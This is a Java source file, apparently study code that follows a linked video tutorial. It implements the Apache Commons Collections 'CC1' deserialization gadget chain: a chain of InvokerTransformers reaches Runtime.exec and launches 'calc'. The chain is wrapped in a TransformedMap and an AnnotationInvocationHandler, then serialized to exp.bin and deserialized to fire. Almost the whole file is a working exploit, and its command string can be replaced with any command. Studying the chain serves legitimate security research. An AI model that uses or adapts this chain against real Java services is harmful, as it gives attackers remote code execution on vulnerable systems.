package Seri.CCGadgets;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

// https://www.bilibili.com/video/BV1no4y1U7E1
public class BRMZZCC1 {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, ClassNotFoundException, InstantiationException {
        // 最初的执行
//        Class c = Runtime.class;
//        Method getRuntimeMethod = c.getMethod("getRuntime",null);
//        Runtime r = (Runtime) getRuntimeMethod.invoke(null ,null);
//        Method execMethod = c.getMethod("exec" ,String.class);
//        execMethod.invoke(r ,"calc");

        // 简化后
//        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
//        Runtime runtime = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class ,Object[].class} ,new Object[]{null ,null}).transform(getRuntimeMethod);
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(runtime);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class ,Object[].class} ,new Object[]{null ,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(Runtime.class);

        HashMap<Object ,Object> map = new HashMap<Object, Object>();
        map.put("value","xxxx");
        Map transfromMap = TransformedMap.decorate(map , null,chainedTransformer);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class , Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Retention.class ,transfromMap);

        serialize(o);
        unserialize("exp.bin");
    }

    public static void serialize(Object object) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("exp.bin"));
        oos.writeObject(object);
        oos.close();
    }
    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
        ois.close();
    }


}
